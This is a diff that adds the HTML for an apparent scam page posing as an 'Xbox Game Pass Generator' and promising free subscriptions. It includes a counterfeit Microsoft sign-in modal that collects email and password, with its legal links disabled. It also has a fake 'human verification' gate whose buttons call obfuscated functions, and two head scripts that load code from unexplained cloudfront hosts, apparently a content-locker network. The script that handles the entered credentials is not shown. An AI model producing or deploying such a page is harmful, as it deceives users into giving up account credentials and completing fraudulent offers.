@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xbox Game Pass Generator 2025</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600;700&display=swap" rel="stylesheet">
+	
+	
+	<script type="text/javascript">
+    var nydwg_vaj_clGguc={"it":4459408,"key":"46345"};
+</script>
+<script src="https://d2yc6hxtq0phup.cloudfront.net/e6923f9.js"></script>
+
+
+<script type="text/javascript">
+    var NNwhe_wfx_VdKqDc={"it":4459921,"key":"4bcc2"};
+</script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/aa06f4a.js"></script>
+
+
+</head>
+<body>
+    <div class="background-overlay"></div>
+    <div class="container">
+        <header class="main-header">
+            <h1 class="title-animation">XBOX GAME PASS GENERATOR</h1>
+            <p class="subtitle">Get unlimited Xbox Game Pass for all platforms, with easy steps!</p>
+            <div class="online-users">
+                <i class="fas fa-users"></i>
+                <span id="online-count">2,867</span> USERS ONLINE NOW
+            </div>
+        </header>
+
+        <div class="generator-box">
+            <!-- Game Pass Tier Selector Section -->
+            <div class="gamepass-selector">
+                <h3>SELECT GAME PASS TIER</h3>
+                <div class="gamepass-options">
+                    <div class="gamepass-card" data-tier="ultimate" style="--card-color: #107C10;">
+                        <img src="img/gamepass.png" alt="Game Pass Ultimate" class="gamepass-image">
+                        <div class="gamepass-overlay"></div>
+                        <div class="gamepass-tier">
+                            <img src="img/xbox-logo.png" alt="Xbox" class="xbox-icon-img">
+                            <span class="tier">ULTIMATE</span>
+                        </div>
+                    </div>
+                    <div class="gamepass-card" data-tier="pc" style="--card-color: #0078D7;">
+                        <img src="img/gamepass.png" alt="Game Pass for PC" class="gamepass-image">
+                        <div class="gamepass-overlay"></div>
+                        <div class="gamepass-tier">
+                            <img src="img/xbox-logo.png" alt="Xbox" class="xbox-icon-img">
+                            <span class="tier">FOR PC</span>
+                        </div>
+                    </div>
+                    <div class="gamepass-card" data-tier="console" style="--card-color: #5DC21E;">
+                        <img src="img/gamepass.png" alt="Game Pass for Console" class="gamepass-image">
+                        <div class="gamepass-overlay"></div>
+                        <div class="gamepass-tier">
+                            <img src="img/xbox-logo.png" alt="Xbox" class="xbox-icon-img">
+                            <span class="tier">FOR CONSOLE</span>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+
+            <!-- Duration Selector -->
+            <div class="duration-selector">
+                <h3>SELECT SUBSCRIPTION DURATION</h3>
+                <div class="duration-options">
+                    <div class="duration-option" data-duration="1">
+                        <span class="duration-value">1</span>
+                        <span class="duration-unit">MONTH</span>
+                    </div>
+                    <div class="duration-option" data-duration="3">
+                        <span class="duration-value">3</span>
+                        <span class="duration-unit">MONTHS</span>
+                    </div>
+                    <div class="duration-option selected" data-duration="6">
+                        <span class="duration-value">6</span>
+                        <span class="duration-unit">MONTHS</span>
+                    </div>
+                    <div class="duration-option" data-duration="12">
+                        <span class="duration-value">12</span>
+                        <span class="duration-unit">MONTHS</span>
+                    </div>
+                </div>
+            </div>
+
+            <button id="connect-button" class="button-generate">
+                <span class="button-text">GENERATE GAME PASS</span>
+                <div class="button-glow"></div>
+            </button>
+            
+            <div class="progress-section">
+                <div id="progress-container" class="progress-container" style="display: none;">
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-glow"></div>
+                        <div class="progress-text">PROCESSING... 0%</div>
+                    </div>
+                </div>
+
+                <div class="status-box" id="status-box">
+                    <div class="status-header">
+                        <i class="fas fa-terminal"></i>
+                        <span>Console Output</span>
+                    </div>
+                    <div class="status-content"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure Connection</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-lock"></i>
+                <span>Encrypted</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-user-shield"></i>
+                <span>Anonymous</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Connecting to Microsoft servers...</div>
+        </div>
+    </div>
+
+    <!-- Microsoft Login Modal -->
+    <div class="microsoft-login-modal" id="microsoft-login-modal">
+        <div class="microsoft-login-content">
+            <div class="microsoft-login-header">
+                <img src="img/ms-logo.png" alt="Microsoft Logo" class="microsoft-logo">
+                <h2 class="microsoft-login-title">Sign in</h2>
+                <p class="microsoft-login-subtitle">to continue to Xbox Game Pass</p>
+            </div>
+
+            <form class="microsoft-login-form" id="microsoft-login-form">
+                <div class="microsoft-form-group">
+                    <label for="microsoft-email">
+                        <i class="fas fa-envelope"></i>
+                        Email, phone, or Skype
+                    </label>
+                    <input type="email" id="microsoft-email" required>
+                </div>
+
+                <div class="microsoft-form-group">
+                    <label for="microsoft-password">
+                        <i class="fas fa-key"></i>
+                        Password
+                    </label>
+                    <input type="password" id="microsoft-password" required>
+                </div>
+
+                <div class="microsoft-form-options">
+                    <div class="stay-signed-in">
+                        <input type="checkbox" id="stay-signed-in">
+                        <label for="stay-signed-in">Stay signed in</label>
+                    </div>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="microsoft-login-button" id="microsoft-login-button" disabled>
+                    <span class="button-text">Sign in</span>
+                    <div class="loading-spinner"></div>
+                </button>
+            </form>
+
+            <div class="microsoft-login-footer">
+                <div class="security-info">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Your information is secure and encrypted</span>
+                </div>
+                <div class="microsoft-login-links">
+                    <a href="https://www.microsoft.com/en-us/legal/terms-of-use" onclick="return false;">Terms of use</a>
+                    <a href="https://privacy.microsoft.com/en-us/privacystatement" onclick="return false;">Privacy & cookies</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Gift Code Generated Modal -->
+    <div class="giftcode-modal" id="giftcode-modal">
+        <div class="giftcode-content">
+            <div class="giftcode-header">
+                <i class="fas fa-gift giftcode-icon"></i>
+                <h2 class="giftcode-title">GAME PASS CODE GENERATED</h2>
+                <p class="giftcode-text">Your Xbox Game Pass gift code has been successfully generated!</p>
+            </div>
+
+            <div class="giftcode-display-section">
+                <div class="giftcode-label">Your Gift Code:</div>
+                <div class="giftcode-box" id="gift-code" data-masked="true">XXXX-XXXXX-XXXXX-XXXXX-*****</div>
+                
+                <div class="giftcode-info">
+                    <div class="tier-duration">
+                        <span id="display-tier">GAME PASS ULTIMATE</span> - 
+                        <span id="display-duration">6</span> MONTH SUBSCRIPTION
+                    </div>
+                </div>
+            </div>
+
+            <button id="activate-button" class="activate-button">
+                <i class="fas fa-check-circle"></i>
+                <span>ACTIVATE NOW</span>
+            </button>
+            
+            <div class="giftcode-note">
+                <i class="fas fa-info-circle"></i>
+                <span>This code will expire in 24 hours if not activated</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Verification Modal -->
+    <div class="verification-modal" id="verification-modal">
+        <div class="verification-content">
+            <div class="verification-header-main">
+                <i class="fas fa-shield-alt verification-shield-icon"></i>
+                <h2 class="verification-title">HUMAN VERIFICATION</h2>
+                <p class="verification-description">To prevent abuse and ensure fair distribution, we need to verify you're human.</p>
+            </div>
+            
+            <div class="verification-options">
+                <div class="verification-option">
+                    <div class="verification-option-header">
+                        <i class="fas fa-tasks"></i>
+                        <span>Complete a quick survey</span>
+                    </div>
+                    <p class="verification-option-text">Answer a few simple questions</p>
+                    <button onclick="_nS()" class="verification-option-button" id="survey-verify-button">
+                        <i class="fas fa-clipboard-check"></i>
+                        <span>COMPLETE SURVEY</span>
+                    </button>
+                </div>
+                
+                <div class="verification-option">
+                    <div class="verification-option-header">
+                        <i class="fas fa-puzzle-piece"></i>
+                        <span>Solve a captcha</span>
+                    </div>
+                    <p class="verification-option-text">Prove you're not a robot</p>
+                    <button onclick="_qW()" class="verification-option-button" id="captcha-verify-button">
+                        <i class="fas fa-robot"></i>
+                        <span>SOLVE CAPTCHA</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div class="verification-footer">
+                <p>Verification helps us prevent bots from abusing our system.</p>
+                <p>Your information is secure and will not be shared.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Xbox Redeem Modal -->
+    <div class="xbox-redeem-modal" id="xbox-redeem-modal">
+        <div class="xbox-redeem-content">
+            <div class="xbox-redeem-header">
+                <div class="redeem-url-bar">
+                    <i class="fas fa-arrow-left"></i>
+                    <i class="fas fa-arrow-right"></i>
+                    <i class="fas fa-sync-alt"></i>
+                    <div class="url-display">xbox.com/en-GB/redeem</div>
+                    <i class="fas fa-star"></i>
+                </div>
+                <div class="close-button" id="redeem-close">×</div>
+            </div>
+
+            <div class="redeem-form-container">
+                <h2 class="redeem-title">Redeem your code or gift card</h2>
+                
+                <p class="redeem-description">
+                    With a Microsoft product key or gift card, you can get access to a wide
+                    selection of the latest apps, games, premium devices, and more. To
+                    redeem your Microsoft or Xbox gift card, please enter your 25-character
+                    code in the space below.
+                </p>
+                
+                <div class="redeem-account-info">
+                    It'll be added to <span id="redeem-account-email">example@outlook.com</span> (United Kingdom)
+                </div>
+                
+                <div class="redeem-code-input">
+                    <input type="text" id="redeem-code-field" value="" readonly>
+                </div>
+                
+                
+                
+                <div class="redeem-buttons">
+                    <button class="redeem-button cancel">CANCEL</button>
+                    <button class="redeem-button next" id="redeem-next-button">NEXT</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Xbox Confirmation Modal -->
+    <div class="xbox-confirm-modal" id="xbox-confirm-modal">
+        <div class="xbox-confirm-content">
+            <div class="xbox-redeem-header">
+                <div class="redeem-url-bar">
+                    <i class="fas fa-arrow-left"></i>
+                    <i class="fas fa-arrow-right"></i>
+                    <i class="fas fa-sync-alt"></i>
+                    <div class="url-display">xbox.com/en-GB/redeem/confirm</div>
+                    <i class="fas fa-star"></i>
+                </div>
+                <div class="close-button" id="confirm-close">×</div>
+            </div>
+
+            <div class="confirm-container">
+                <h2 class="confirm-title">Here is what you get</h2>
+                
+                <div class="product-container">
+                    <div class="product-image">
+                        <img src="img/gamepass-icon.jpg" alt="Game Pass" class="gamepass-product-icon">
+                    </div>
+                    <div class="product-details">
+                        <div class="product-name" id="confirm-product-name">Xbox Game Pass Ultimate – Ultimate 6 Month</div>
+                        <div class="product-publisher">Microsoft Corporation</div>
+                    </div>
+                </div>
+                
+                <div class="terms-container">
+                    <p class="terms-text">
+                        By selecting Confirm, you agree to the 
+                        <a href="#" class="terms-link">Store Terms of Sale</a>, 
+                        <a href="#" class="terms-link">Microsoft Gift Terms and Conditions</a> and 
+                        <a href="#" class="terms-link">Usage rules for Digital Goods</a>. No refunds.
+                    </p>
+                </div>
+                
+                <div class="confirm-button-container">
+                    <button class="confirm-button" id="final-confirm-button">CONFIRM</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="success-modal" id="success-modal">
+        <div class="success-content">
+            <div class="success-icon">
+                <svg viewBox="0 0 52 52" class="checkmark">
+                    <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+            </div>
+
+            <h2 class="success-title">SUCCESS!</h2>
+
+            <div class="gamepass-display">
+                <img src="img/xbox-logo.png" alt="Xbox Logo" class="xbox-logo-img animated">
+                <span id="success-gamepass-tier">GAME PASS ULTIMATE</span>
+                <img src="img/xbox-logo.png" alt="Xbox Logo" class="xbox-logo-img animated">
+            </div>
+
+            <div class="subscription-details">
+                <p class="success-duration"><span id="success-duration">6</span> MONTH SUBSCRIPTION</p>
+                <p class="success-account">Account: <span id="success-account">example@outlook.com</span></p>
+            </div>
+
+            <p class="success-message">Your Xbox Game Pass subscription has been successfully activated!</p>
+
+            <button class="done-button" id="done-button">
+                <i class="fas fa-check"></i>
+                <span>DONE</span>
+            </button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
